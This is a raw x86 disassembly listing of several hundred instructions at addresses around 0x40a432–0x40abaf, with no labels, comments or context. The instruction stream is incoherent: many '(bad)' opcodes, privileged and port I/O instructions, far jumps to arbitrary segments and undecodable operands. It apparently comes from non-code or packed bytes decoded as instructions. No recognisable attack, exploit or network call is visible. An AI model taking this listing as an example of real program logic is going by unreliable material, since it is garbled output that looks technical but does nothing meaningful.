  40a432:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a433:	xor    DWORD PTR [ebp-0x59],ebp
  40a436:	or     cl,ch
  40a438:	into   
  40a439:	mov    ah,0xe6
  40a43b:	add    bh,BYTE PTR ds:0xabebc4f0
  40a441:	push   0x62
  40a443:	lahf   
  40a444:	xchg   esi,eax
  40a445:	mov    esp,DWORD PTR [eax-0x65c9fed9]
  40a44b:	fiadd  DWORD PTR [ebp-0x51]
  40a44e:	mov    cx,0x96d3
  40a452:	xor    eax,0xe384ce77
  40a457:	xchg   ecx,eax
  40a458:	add    al,0x74
  40a45a:	retf   
  40a45b:	mov    al,0x76
  40a45d:	adc    DWORD PTR [edi],ecx
  40a45f:	jae    0x40a3e3
  40a461:	inc    ebp
  40a462:	xor    DWORD PTR ds:0xbd8a28c6,esp
  40a468:	push   edi
  40a469:	mov    ebp,0xad1282d4
  40a46e:	hlt    
  40a46f:	mul    BYTE PTR [edx-0x25]
  40a472:	ds mov ch,0xd8
  40a475:	dec    ebx
  40a476:	pop    es
  40a477:	js     0x40a44f
  40a479:	jae    0x40a4b1
  40a47b:	(bad)  
  40a47c:	and    DWORD PTR [eax-0x58f160d7],edx
  40a482:	fdivr  QWORD PTR [esi+0xb]
  40a485:	xchg   esp,eax
  40a486:	push   ecx
  40a487:	and    DWORD PTR [ebx+0x1cfb13c6],ebp
  40a48d:	xor    DWORD PTR [edi+0x19],esi
  40a490:	test   DWORD PTR [edx+0x750375f2],0xe7b0b6e4
  40a49a:	sub    dl,BYTE PTR [edi+0x6d0a314e]
  40a4a0:	shr    BYTE PTR [edi],1
  40a4a2:	dec    edx
  40a4a3:	and    ch,BYTE PTR [ebx+ecx*8-0x68]
  40a4a7:	mov    al,ds:0xd08805aa
  40a4ac:	lods   eax,DWORD PTR ds:[esi]
  40a4ad:	and    esi,DWORD PTR [ecx+0x1]
  40a4b0:	bound  edi,QWORD PTR ds:0xffee778
  40a4b6:	inc    ecx
  40a4b7:	and    bh,ch
  40a4b9:	cmp    DWORD PTR [edx],0x7443a4d7
  40a4bf:	fwait
  40a4c0:	out    dx,al
  40a4c1:	add    DWORD PTR [ebx],esp
  40a4c3:	sub    al,0x6b
  40a4c5:	ror    BYTE PTR [ecx+0x21e302dc],1
  40a4cb:	fs sbb eax,0x7b9165bb
  40a4d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a4d2:	xor    al,0xc3
  40a4d4:	mov    ebp,0x3db562bc
  40a4d9:	xchg   esi,eax
  40a4da:	sub    al,0x86
  40a4dc:	in     eax,dx
  40a4dd:	cmp    BYTE PTR [esi+0x6],cl
  40a4e0:	mov    edx,0x666cd675
  40a4e5:	mov    eax,ds:0xa5776736
  40a4ea:	stos   DWORD PTR es:[edi],eax
  40a4eb:	into   
  40a4ec:	push   0x5dccfc3b
  40a4f1:	scas   eax,DWORD PTR es:[edi]
  40a4f2:	mov    ecx,0x18933f02
  40a4f7:	sbb    al,ah
  40a4f9:	sbb    DWORD PTR [edi-0x27],ebp
  40a4fc:	push   edi
  40a4fd:	inc    edx
  40a4fe:	pop    es
  40a4ff:	aas    
  40a500:	je     0x40a538
  40a502:	inc    ebx
  40a503:	mov    cl,0x29
  40a505:	fmul   DWORD PTR [edi-0x25]
  40a508:	retfw  0x167d
  40a50c:	lods   al,BYTE PTR ds:[esi]
  40a50d:	and    ebx,DWORD PTR [ecx+0x79349d90]
  40a513:	adc    al,0xd9
  40a515:	fild   WORD PTR [ecx]
  40a517:	adc    ebx,ebp
  40a519:	fdivr  st,st(6)
  40a51b:	test   eax,0x11ca65e
  40a520:	cmp    BYTE PTR [esi-0x29],0x92
  40a524:	jne    0x40a569
  40a526:	mov    eax,ds:0xb3c5fddb
  40a52b:	hlt    
  40a52c:	xchg   edi,eax
  40a52d:	arpl   WORD PTR [ecx+0x6c37d986],dx
  40a533:	inc    ebx
  40a534:	dec    ecx
  40a535:	outs   dx,DWORD PTR ds:[esi]
  40a536:	ins    BYTE PTR es:[edi],dx
  40a537:	stos   BYTE PTR es:[edi],al
  40a538:	daa    
  40a539:	push   ds
  40a53a:	push   ds
  40a53b:	cmp    cl,cl
  40a53d:	fs sub bl,bl
  40a540:	fistp  DWORD PTR [edi]
  40a542:	mov    BYTE PTR [eax],al
  40a544:	(bad)  
  40a545:	sub    eax,0xf85b9fef
  40a54a:	cmc    
  40a54b:	stos   BYTE PTR es:[edi],al
  40a54c:	push   ecx
  40a54d:	jg     0x40a5b8
  40a54f:	add    eax,0x85f7face
  40a554:	xor    al,0x15
  40a556:	jp     0x40a55e
  40a558:	xor    eax,0x6590cb77
  40a55d:	and    eax,0x873e0cdb
  40a562:	retf   0x6ed9
  40a565:	cmp    eax,0x6a01c480
  40a56a:	imul   eax,DWORD PTR [eax+0x27e1be7b],0x5ac95c0d
  40a574:	mov    ebx,0x7f597da4
  40a579:	add    al,0x7a
  40a57b:	hlt    
  40a57c:	mov    WORD PTR [ecx],fs
  40a57e:	loopne 0x40a5b3
  40a580:	push   ecx
  40a581:	or     al,0x4c
  40a583:	sti    
  40a584:	loop   0x40a590
  40a586:	mov    edi,0x3f5cc8fe
  40a58b:	cwde   
  40a58c:	push   edx
  40a58d:	jp     0x40a5aa
  40a58f:	enter  0x6060,0xa6
  40a593:	push   ds
  40a594:	fs pop eax
  40a596:	and    BYTE PTR [edx],bl
  40a598:	sbb    al,0x95
  40a59a:	add    esi,edx
  40a59c:	pop    ss
  40a59d:	loope  0x40a61e
  40a59f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5a0:	xchg   esi,eax
  40a5a1:	lea    ebp,[bp+si]
  40a5a4:	fdivr  st(5),st
  40a5a6:	mov    cs,WORD PTR [edi-0x5f]
  40a5a9:	cli    
  40a5aa:	cwde   
  40a5ab:	popf   
  40a5ac:	cli    
  40a5ad:	test   edx,edi
  40a5af:	mov    edi,0xd3e16122
  40a5b4:	adc    DWORD PTR [ecx+eax*2-0x28],0xfffffffb
  40a5b9:	cmp    eax,0xb85f6820
  40a5be:	xor    edx,DWORD PTR [edi-0x5fb0383]
  40a5c4:	xchg   ecx,eax
  40a5c5:	ins    DWORD PTR es:[edi],dx
  40a5c6:	xchg   edi,eax
  40a5c7:	dec    edi
  40a5c8:	xor    BYTE PTR [eax+0x34],cl
  40a5cb:	lea    esi,[esi+0xded67e]
  40a5d1:	mov    ebx,0x706a0daf
  40a5d6:	add    eax,0x41c1985a
  40a5db:	pop    edi
  40a5dc:	mov    cl,dh
  40a5de:	jp     0x40a59a
  40a5e0:	add    bh,cl
  40a5e2:	mov    ?,ebp
  40a5e4:	loope  0x40a656
  40a5e6:	cdq    
  40a5e7:	add    ah,dl
  40a5e9:	mov    ds:0xe49350e8,al
  40a5ee:	cmp    BYTE PTR [ebp-0x79fc736c],cl
  40a5f4:	jb     0x40a5ca
  40a5f6:	aad    0x9d
  40a5f8:	test   eax,0xc8036dda
  40a5fd:	mul    DWORD PTR ds:0xb326bdab
  40a603:	sub    BYTE PTR [ebp-0x73],ah
  40a606:	adc    eax,DWORD PTR [esi-0x1224a428]
  40a60c:	mov    al,0xc7
  40a60e:	rcl    DWORD PTR ds:0x160a0456,1
  40a614:	cli    
  40a615:	xchg   esi,eax
  40a616:	dec    eax
  40a617:	js     0x40a5b1
  40a619:	adc    bl,BYTE PTR [ecx]
  40a61b:	(bad)  
  40a61c:	retf   0xc765
  40a61f:	jo     0x40a65d
  40a621:	add    dl,ch
  40a623:	cmp    eax,0x665bbbe3
  40a628:	xor    eax,0x8b3d49ee
  40a62d:	or     esp,DWORD PTR [ebx-0x7e]
  40a630:	push   esi
  40a631:	sar    BYTE PTR [edi+edi*8-0x313355ac],0xf
  40a639:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a63a:	das    
  40a63b:	and    ah,BYTE PTR [edx-0x21]
  40a63e:	(bad)  
  40a63f:	shl    cl,1
  40a641:	int3   
  40a642:	fmul   QWORD PTR [edx+0x6b011934]
  40a648:	inc    eax
  40a649:	imul   esi,DWORD PTR [esi],0x3e
  40a64c:	xchg   edx,eax
  40a64d:	out    0x91,eax
  40a64f:	add    al,0x23
  40a651:	jg     0x40a5ec
  40a653:	scas   al,BYTE PTR es:[edi]
  40a654:	outs   dx,BYTE PTR ds:[esi]
  40a655:	not    BYTE PTR [ecx-0x44]
  40a658:	add    ch,dl
  40a65a:	aad    0xa6
  40a65c:	jne    0x40a666
  40a65e:	jnp    0x40a61f
  40a660:	(bad)  
  40a661:	or     ecx,DWORD PTR [ecx]
  40a663:	push   esi
  40a664:	ds mov cl,0x9d
  40a667:	sub    edi,DWORD PTR [edx]
  40a669:	ss in  eax,0x3
  40a66c:	dec    esi
  40a66d:	jge    0x40a6bf
  40a66f:	add    DWORD PTR [edx],esp
  40a671:	cs push cs
  40a673:	sub    esi,DWORD PTR [edi+ecx*2]
  40a676:	setns  bh
  40a679:	pop    ss
  40a67a:	(bad)  
  40a67b:	mov    ch,0xe8
  40a67d:	icebp  
  40a67e:	mov    edi,0xbe200b6f
  40a683:	test   BYTE PTR [ebp-0x57],0x43
  40a687:	jl     0x40a6f9
  40a689:	mov    al,0xc6
  40a68b:	bound  edi,QWORD PTR [ecx-0x4753df92]
  40a691:	sbb    al,0x12
  40a693:	cmp    dl,ch
  40a695:	mov    edi,0x8aa0ab21
  40a69a:	int3   
  40a69b:	push   eax
  40a69c:	xor    al,0xee
  40a69e:	fld    QWORD PTR [ebx-0x29d46ec1]
  40a6a4:	sbb    edi,DWORD PTR [ebx-0x116aea5]
  40a6aa:	in     eax,dx
  40a6ab:	outs   dx,DWORD PTR ds:[esi]
  40a6ac:	jno    0x40a6e9
  40a6ae:	pop    eax
  40a6af:	jmp    0x904e7999
  40a6b4:	enter  0xb712,0x8e
  40a6b8:	dec    DWORD PTR [ebp+0x68]
  40a6bb:	aad    0xc4
  40a6bd:	sub    esi,DWORD PTR [ecx+0x58]
  40a6c0:	fnstenv [eax-0x768309f9]
  40a6c6:	adc    edi,DWORD PTR [edi+0x1a]
  40a6c9:	pop    ds
  40a6ca:	ret    
  40a6cb:	push   0xd8ada634
  40a6d0:	call   0xf37e:0x7cba1cfa
  40a6d7:	mov    BYTE PTR [ecx+0x33c46a39],0x3a
  40a6de:	add    al,0xc2
  40a6e0:	mov    al,ds:0x8e4eb1ad
  40a6e5:	jno    0x40a749
  40a6e7:	clc    
  40a6e8:	or     ebx,DWORD PTR [edx+0x58]
  40a6eb:	add    BYTE PTR [edx],bh
  40a6ed:	jmp    0x8cfdfbae
  40a6f2:	call   0x7a29e09
  40a6f7:	push   ss
  40a6f8:	mov    ebp,0xc84c43a3
  40a6fd:	jmp    0x40a6d0
  40a6ff:	dec    ebp
  40a700:	or     BYTE PTR [ebx+0xc3e4905],bh
  40a706:	pop    eax
  40a707:	jg     0x40a6aa
  40a709:	retf   0x5961
  40a70c:	inc    ebx
  40a70d:	js     0x40a718
  40a70f:	mov    edi,0xc14f632
  40a714:	mov    bl,0x16
  40a716:	retf   
  40a717:	retf   0xe3ee
  40a71a:	or     BYTE PTR [edx+0x72329498],cl
  40a720:	clc    
  40a721:	clc    
  40a722:	cmp    ah,BYTE PTR [edi]
  40a724:	add    DWORD PTR [edi+0x3789f22a],eax
  40a72a:	push   0x6d
  40a72c:	xchg   edi,eax
  40a72d:	in     al,dx
  40a72e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a72f:	scas   eax,DWORD PTR es:[edi]
  40a730:	jns    0x40a6b9
  40a732:	fdivr  st(6),st
  40a734:	scas   eax,DWORD PTR es:[edi]
  40a735:	leave  
  40a736:	pop    eax
  40a737:	mov    al,0xb8
  40a739:	int3   
  40a73a:	xchg   edx,eax
  40a73b:	fs push ds
  40a73d:	test   al,0xc6
  40a73f:	mov    dl,0xad
  40a741:	xlat   BYTE PTR ds:[ebx]
  40a742:	jle    0x40a6cc
  40a744:	ret    
  40a745:	or     al,0xb4
  40a747:	cmpps  xmm6,xmm6,0x82
  40a74b:	inc    esi
  40a74c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a74d:	mov    ds:0x8d1508cc,al
  40a752:	dec    edx
  40a753:	push   ebx
  40a754:	mul    DWORD PTR [ebx-0x5d]
  40a757:	loope  0x40a786
  40a759:	fld    TBYTE PTR [esp+eax*2-0x53]
  40a75d:	and    eax,edx
  40a75f:	push   edi
  40a760:	add    BYTE PTR [edx+0x7e],dl
  40a763:	jle    0x40a7af
  40a765:	test   eax,0x8aae8919
  40a76a:	ins    BYTE PTR es:[edi],dx
  40a76b:	fistp  WORD PTR [eax-0x45]
  40a76e:	cmc    
  40a76f:	cmp    edi,esi
  40a771:	lahf   
  40a772:	adc    ebx,DWORD PTR [ebx]
  40a774:	xor    DWORD PTR [edi+edx*4-0x1fb016a5],0xc2baf636
  40a77f:	(bad)  
  40a780:	sub    dh,BYTE PTR [ecx]
  40a782:	jns    0x40a7c6
  40a784:	xchg   esi,eax
  40a785:	scas   eax,DWORD PTR es:[edi]
  40a786:	dec    esi
  40a787:	jmp    0x49f:0xd31b429b
  40a78e:	mov    ah,0x41
  40a790:	aad    0x8c
  40a792:	sub    edi,DWORD PTR [edx-0x3d]
  40a795:	div    esi
  40a797:	mov    WORD PTR [edi-0x33],cs
  40a79a:	mov    bl,0x3d
  40a79c:	mov    eax,ds:0x7db8a2cd
  40a7a1:	mul    al
  40a7a3:	sahf   
  40a7a4:	jb     0x40a784
  40a7a6:	sbb    cl,BYTE PTR [eax-0x3728e97d]
  40a7ac:	in     eax,dx
  40a7ad:	call   0x70df:0xfb592229
  40a7b4:	das    
  40a7b5:	jmp    0x1f63:0x2d23cf7c
  40a7bc:	cmp    DWORD PTR [ebx+edx*2-0x1a],ebx
  40a7c0:	mov    ecx,0x3cfa07ce
  40a7c5:	(bad)  [edx]
  40a7c7:	hlt    
  40a7c8:	ret    0x2fbe
  40a7cb:	cmp    al,BYTE PTR [edx+0x43]
  40a7ce:	call   0x5d43249b
  40a7d3:	push   edi
  40a7d4:	mov    ah,0xd4
  40a7d6:	lock jp 0x40a7d3
  40a7d9:	scas   eax,DWORD PTR es:[edi]
  40a7da:	mov    eax,DWORD PTR [ebx+ebp*8+0x61]
  40a7de:	or     al,BYTE PTR [eax+0x53b57dbc]
  40a7e4:	add    al,0xd3
  40a7e6:	cwde   
  40a7e7:	xor    DWORD PTR [ecx],0x6fe816d7
  40a7ed:	das    
  40a7ee:	dec    ebp
  40a7ef:	push   cs
  40a7f0:	cs pop edx
  40a7f2:	retf   0xeec2
  40a7f5:	sbb    cl,BYTE PTR [edi-0x3513a91f]
  40a7fb:	pop    eax
  40a7fc:	and    eax,0x6b87bd31
  40a801:	jb     0x40a848
  40a803:	shl    BYTE PTR [eax],cl
  40a805:	loop   0x40a83c
  40a807:	shl    BYTE PTR [edx+0x36],1
  40a80a:	into   
  40a80b:	jecxz  0x40a7df
  40a80d:	imul   BYTE PTR [edx-0x66c9e531]
  40a813:	loop   0x40a796
  40a815:	pop    ss
  40a816:	and    DWORD PTR [ecx-0x409400bd],edx
  40a81c:	xchg   esp,eax
  40a81d:	adc    cl,BYTE PTR [eax]
  40a81f:	hlt    
  40a820:	jmp    0xfb3a5be8
  40a825:	jmp    0x40a844
  40a827:	and    bl,BYTE PTR [esi-0x1a]
  40a82a:	scas   al,BYTE PTR es:[edi]
  40a82b:	nop
  40a82c:	outs   dx,DWORD PTR ds:[esi]
  40a82d:	dec    ebp
  40a82e:	ins    BYTE PTR es:[edi],dx
  40a82f:	sti    
  40a830:	mov    BYTE PTR [edx-0x35ba54b6],ch
  40a836:	or     eax,DWORD PTR [edx]
  40a838:	xchg   esi,eax
  40a839:	inc    esp
  40a83a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a83b:	dec    ecx
  40a83c:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a83e:	imul   edx,eax,0x9f12eb48
  40a844:	fistp  QWORD PTR [ebx]
  40a846:	les    esp,FWORD PTR [ebx-0xd]
  40a849:	mov    eax,ds:0xf14debd
  40a84e:	sub    dl,BYTE PTR [eax+0x30ce222f]
  40a854:	imul   eax,esp,0x117f0224
  40a85a:	sahf   
  40a85b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a85c:	dec    ecx
  40a85d:	mov    ah,0x4f
  40a85f:	sub    al,0x94
  40a861:	in     eax,dx
  40a862:	jne    0x40a877
  40a864:	jne    0x40a8e5
  40a866:	pushf  
  40a867:	(bad)  
  40a868:	aad    0x70
  40a86a:	push   0x2ae8aaae
  40a86f:	fidiv  WORD PTR [eax]
  40a871:	push   esp
  40a872:	pushf  
  40a873:	mov    ds:0x7bc5d103,eax
  40a878:	aas    
  40a879:	adc    BYTE PTR [ebx],al
  40a87b:	inc    ebp
  40a87c:	mov    dl,0x7b
  40a87e:	inc    ebx
  40a87f:	mov    edi,0xbd15d78e
  40a884:	out    dx,eax
  40a885:	inc    eax
  40a886:	rcr    ecx,cl
  40a888:	mov    eax,0x2c119752
  40a88d:	mov    ebx,ecx
  40a88f:	mov    ds:0x75034184,al
  40a894:	cmp    DWORD PTR [esi-0x6d10b20d],edi
  40a89a:	lods   al,BYTE PTR ds:[esi]
  40a89b:	xor    eax,0x35821268
  40a8a0:	adc    BYTE PTR [eax+0x65bda50c],bl
  40a8a6:	lods   al,BYTE PTR ds:[esi]
  40a8a7:	jecxz  0x40a8b7
  40a8a9:	xchg   ecx,eax
  40a8aa:	data16 clc 
  40a8ac:	pop    ecx
  40a8ad:	cwde   
  40a8ae:	add    BYTE PTR [esi],bh
  40a8b0:	fwait
  40a8b1:	mov    DWORD PTR [edi+0x237cba94],esi
  40a8b7:	sbb    al,0x71
  40a8b9:	pop    esp
  40a8ba:	mov    al,ds:0xb94054d1
  40a8bf:	or     ecx,DWORD PTR [edx-0x3ec45ff4]
  40a8c5:	retf   0x441d
  40a8c8:	and    cl,BYTE PTR ds:0x13cee01d
  40a8ce:	in     eax,0xef
  40a8d0:	mov    edx,0xd071676a
  40a8d5:	inc    ebx
  40a8d6:	sub    BYTE PTR [ecx],ch
  40a8d8:	sbb    BYTE PTR gs:[eax-0x42e08fa0],dh
  40a8df:	ret    0x6c5c
  40a8e2:	sub    dl,al
  40a8e4:	mov    al,0x1d
  40a8e6:	hlt    
  40a8e7:	xor    dh,dh
  40a8e9:	shr    DWORD PTR ds:[edi-0x3b],cl
  40a8ed:	std    
  40a8ee:	adc    BYTE PTR [edi],ch
  40a8f0:	jae    0x40a8f4
  40a8f2:	ret    
  40a8f3:	add    esp,DWORD PTR ds:0x4b2d85d8
  40a8f9:	jecxz  0x40a8a8
  40a8fb:	push   esi
  40a8fc:	hlt    
  40a8fd:	xchg   BYTE PTR [ebp+0x1262cdd3],al
  40a903:	fs pop esi
  40a905:	and    bl,BYTE PTR [ebx+eiz*8]
  40a908:	(bad)  
  40a909:	out    dx,al
  40a90a:	or     bl,0x3f
  40a90d:	push   0x963236bf
  40a912:	repnz fcom st(0)
  40a915:	sbb    BYTE PTR [ecx+ebx*8],ch
  40a918:	xchg   edi,eax
  40a919:	mov    cl,0x32
  40a91b:	add    al,0xbc
  40a91d:	xchg   edi,eax
  40a91e:	xchg   esi,eax
  40a91f:	pop    edi
  40a920:	cs stos DWORD PTR es:[edi],eax
  40a922:	push   es
  40a923:	sbb    eax,0xf2607651
  40a928:	mov    cl,0x81
  40a92a:	add    eax,0x618c1df4
  40a92f:	iret   
  40a930:	cdq    
  40a931:	push   ds
  40a932:	xor    DWORD PTR [edx],0xffffff8d
  40a935:	repz jl 0x40a8da
  40a938:	aaa    
  40a939:	mov    BYTE PTR [esi-0x7e],0x5b
  40a93d:	jg     0x40a94e
  40a93f:	mov    esi,0xccaca18a
  40a944:	pop    eax
  40a945:	mov    dh,0x62
  40a947:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a948:	add    ebx,edx
  40a94a:	mov    al,0xee
  40a94c:	in     eax,dx
  40a94d:	add    cl,BYTE PTR [eax-0x565fe872]
  40a953:	outs   dx,BYTE PTR ds:[esi]
  40a954:	(bad)  
  40a955:	and    BYTE PTR [esi+0x290f39a2],bh
  40a95b:	cmp    bl,BYTE PTR ds:[edi-0x77]
  40a95f:	lock mov ds:0xa70d5423,eax
  40a965:	xor    DWORD PTR [ecx+0x62614ab6],esi
  40a96b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a96c:	mov    dl,0xee
  40a96e:	push   ss
  40a96f:	pop    ds
  40a970:	adc    al,0xa1
  40a972:	call   0xcf8e51d7
  40a977:	jbe    0x40a931
  40a979:	dec    esi
  40a97a:	mov    ebx,0xf18ce9b0
  40a97f:	mov    ch,0x6a
  40a981:	adc    eax,0x9eea7602
  40a986:	or     eax,0x5840be4b
  40a98b:	stos   DWORD PTR es:[edi],eax
  40a98c:	rcl    BYTE PTR [edi+0x18f75018],1
  40a992:	xchg   ebp,eax
  40a993:	mov    cl,0x52
  40a995:	daa    
  40a996:	lods   eax,DWORD PTR ds:[esi]
  40a997:	dec    ebx
  40a998:	push   eax
  40a999:	mov    ?,WORD PTR [edx-0x31]
  40a99c:	push   edx
  40a99d:	mov    ebx,0x7dfd8df7
  40a9a2:	mov    ebp,0x9f25af43
  40a9a7:	xor    bl,BYTE PTR [edx]
  40a9a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9aa:	femms  
  40a9ac:	pop    ebx
  40a9ad:	sbb    eax,0xa4bcd1e3
  40a9b2:	or     al,BYTE PTR [ecx+0x11b5a018]
  40a9b8:	jae    0x40a9c6
  40a9ba:	push   ebx
  40a9bb:	push   0x5a
  40a9bd:	cmp    al,BYTE PTR [edx+0x6c34a539]
  40a9c3:	shl    BYTE PTR [ecx-0x1a706714],0x2d
  40a9ca:	popf   
  40a9cb:	mov    al,0x1
  40a9cd:	lods   al,BYTE PTR ds:[esi]
  40a9ce:	xchg   esp,eax
  40a9cf:	enter  0xaf4c,0xe6
  40a9d3:	jo     0x40a9a5
  40a9d5:	mov    WORD PTR [edi-0x2e],fs
  40a9d8:	popa   
  40a9d9:	jmp    0x40aa3c
  40a9db:	dec    edi
  40a9dc:	test   DWORD PTR [esi-0x5b],eax
  40a9df:	inc    esp
  40a9e0:	je     0x40a9a2
  40a9e2:	jno    0x40a9e1
  40a9e4:	aad    0xca
  40a9e6:	ror    DWORD PTR [esi+0x61],cl
  40a9e9:	in     al,0xdb
  40a9eb:	pop    edi
  40a9ec:	pusha  
  40a9ed:	cmp    ebx,ecx
  40a9ef:	stc    
  40a9f0:	addr16 sbb al,0x1b
  40a9f3:	arpl   WORD PTR [eax+0x15],si
  40a9f6:	pop    ds
  40a9f7:	dec    ebp
  40a9f8:	(bad)  
  40a9f9:	fcomp  DWORD PTR [edi]
  40a9fb:	imul   edx,DWORD PTR [edx-0x21],0xffffffcd
  40a9ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa00:	mov    bl,0x1a
  40aa02:	pop    esi
  40aa03:	ss jl  0x40a9cf
  40aa06:	sbb    DWORD PTR [ebp+0x6b1d9902],ebx
  40aa0c:	cmp    BYTE PTR [ecx+0x359c60d2],0x49
  40aa13:	pop    es
  40aa14:	mov    dh,0xe6
  40aa16:	test   DWORD PTR [edi+0x721c5cf4],ebp
  40aa1c:	pop    edx
  40aa1d:	sahf   
  40aa1e:	js     0x40a9fc
  40aa20:	enter  0x8b24,0xc6
  40aa24:	adc    cl,cl
  40aa26:	and    ebp,DWORD PTR [ecx+0x52]
  40aa29:	dec    edx
  40aa2a:	inc    edi
  40aa2b:	out    0xb,eax
  40aa2d:	add    BYTE PTR [ecx],0x4
  40aa30:	lods   al,BYTE PTR ds:[esi]
  40aa31:	fnstenv ds:0x40125b63
  40aa37:	mov    dl,0x1d
  40aa39:	pusha  
  40aa3a:	or     BYTE PTR [esp+eiz*4+0xd],cl
  40aa3e:	pop    ds
  40aa3f:	dec    ecx
  40aa40:	jle    0x40aa68
  40aa42:	mov    ebp,DWORD PTR [edx+ecx*2-0xf]
  40aa46:	cmp    DWORD PTR [ebp+0x6be285a7],0x9e88e27f
  40aa50:	xchg   BYTE PTR [ebx+ebx*8],al
  40aa53:	retf   
  40aa54:	ds mov bh,0x43
  40aa57:	iret   
  40aa58:	sti    
  40aa59:	ror    ah,cl
  40aa5b:	push   ebp
  40aa5c:	push   ebx
  40aa5d:	shl    DWORD PTR [esi+edx*1],1
  40aa60:	cmp    al,0xec
  40aa62:	mov    ebp,0x21e3dcdf
  40aa67:	enter  0x44fb,0xc1
  40aa6b:	in     al,dx
  40aa6c:	and    al,0xe4
  40aa6e:	adc    al,0x4e
  40aa70:	jecxz  0x40aa76
  40aa72:	sub    eax,0x4369eb82
  40aa77:	ins    DWORD PTR es:[edi],dx
  40aa78:	ins    BYTE PTR es:[edi],dx
  40aa79:	sbb    BYTE PTR [edi],dh
  40aa7b:	lods   eax,DWORD PTR ds:[esi]
  40aa7c:	push   0x8e6a56ac
  40aa81:	test   eax,0xf6bc03a9
  40aa86:	add    edi,DWORD PTR [eax+0x3f]
  40aa89:	xchg   esp,eax
  40aa8a:	icebp  
  40aa8b:	clc    
  40aa8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa8d:	aas    
  40aa8e:	cmp    dh,BYTE PTR [eax-0x21]
  40aa91:	push   esp
  40aa92:	sub    ebp,ebp
  40aa94:	add    BYTE PTR [ecx+0xf97b2b0],al
  40aa9a:	mov    al,ds:0x1cd65d13
  40aa9f:	mov    BYTE PTR [esi],dh
  40aaa1:	mov    ds:0xcdfc5a40,al
  40aaa6:	cmp    BYTE PTR ds:0xac63e407,0xfb
  40aaad:	lock or ebx,DWORD PTR [ecx]
  40aab0:	cwde   
  40aab1:	mov    dh,ch
  40aab3:	dec    eax
  40aab4:	sbb    eax,edi
  40aab6:	std    
  40aab7:	pop    es
  40aab8:	(bad)  
  40aab9:	pop    ecx
  40aaba:	iret   
  40aabb:	sbb    DWORD PTR [ebx-0x4c],edx
  40aabe:	dec    edx
  40aabf:	or     DWORD PTR [esi],eax
  40aac1:	jp     0x40ab0a
  40aac3:	mov    edi,0x1300c15c
  40aac8:	rol    ch,0xcb
  40aacb:	cli    
  40aacc:	mov    edi,0xa6cf52d9
  40aad1:	repz (bad) 
  40aad3:	repz popa 
  40aad5:	jge    0x40ab15
  40aad7:	ret    
  40aad8:	in     eax,0xf8
  40aada:	pushf  
  40aadb:	mov    ds:0x9ef46c3a,eax
  40aae0:	cmp    DWORD PTR [edx-0x24],eax
  40aae3:	cs mov eax,0x26c78513
  40aae9:	fs loope 0x40ab51
  40aaec:	hlt    
  40aaed:	push   edi
  40aaee:	stos   BYTE PTR es:[edi],al
  40aaef:	lea    eax,[ebx+0x861cc2c]
  40aaf5:	dec    ebx
  40aaf6:	add    al,0x16
  40aaf8:	pop    esp
  40aaf9:	(bad)  
  40aafa:	mov    gs,WORD PTR [edi+0x516d5cf0]
  40ab00:	adc    bh,BYTE PTR [eax]
  40ab02:	and    eax,DWORD PTR [ebx+0x49f094ff]
  40ab08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab09:	out    dx,eax
  40ab0a:	mov    ebp,0x95483114
  40ab0f:	leave  
  40ab10:	and    dl,dh
  40ab12:	(bad)  
  40ab14:	adc    dl,BYTE PTR [ecx-0x5e]
  40ab17:	in     eax,dx
  40ab18:	sbb    BYTE PTR [ebp-0x56cbf0e2],0x17
  40ab1f:	outs   dx,BYTE PTR ds:[esi]
  40ab20:	(bad)  
  40ab21:	test   al,0x22
  40ab23:	pusha  
  40ab24:	xchg   edx,eax
  40ab25:	gs call 0x9253:0x8a5ac9c
  40ab2d:	mov    ebx,DWORD PTR [ecx-0x57711322]
  40ab33:	retf   
  40ab34:	mov    dl,0xd5
  40ab36:	cmc    
  40ab37:	pushf  
  40ab38:	shl    BYTE PTR [ebx+0x7b],1
  40ab3b:	cmp    al,BYTE PTR [eax-0x1ad11123]
  40ab41:	(bad)  
  40ab42:	loop   0x40aafc
  40ab44:	jge    0x40ab7d
  40ab46:	push   0x49
  40ab48:	mov    ecx,0x7573a524
  40ab4d:	das    
  40ab4e:	sbb    ah,cl
  40ab50:	test   DWORD PTR [ebp-0x5f469fc1],ebp
  40ab56:	adc    eax,0x19f57c89
  40ab5b:	int    0x60
  40ab5d:	iret   
  40ab5e:	aad    0xf1
  40ab60:	push   ss
  40ab61:	clc    
  40ab62:	dec    ecx
  40ab63:	inc    esp
  40ab64:	and    al,0x94
  40ab66:	adc    eax,0x58eaed7a
  40ab6b:	jmp    0x538a:0x7cb0a2bd
  40ab72:	mov    bl,0x82
  40ab74:	add    al,0x13
  40ab77:	cmp    al,0x11
  40ab79:	js     0x40ab26
  40ab7b:	loopne 0x40abd0
  40ab7d:	clc    
  40ab7e:	jg     0x40abcb
  40ab80:	push   esp
  40ab81:	out    dx,al
  40ab82:	aad    0xa3
  40ab84:	sbb    edi,DWORD PTR [ebp+0x1fb1a991]
  40ab8a:	jbe    0x40ab36
  40ab8c:	or     eax,0xfd2421df
  40ab91:	and    BYTE PTR [eax-0x47],ah
  40ab94:	sar    BYTE PTR [ebp+0x2c502ac1],cl
  40ab9a:	test   DWORD PTR [edi+0x49],0x88603860
  40aba1:	arpl   sp,di
  40aba3:	inc    esp
  40aba4:	repz xor dl,ah
  40aba7:	cmp    BYTE PTR [ebx-0x7e],bl
  40abaa:	push   cs
  40abab:	push   esi
  40abac:	popa   
  40abad:	pop    edi
  40abae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40abaf:	inc    esp
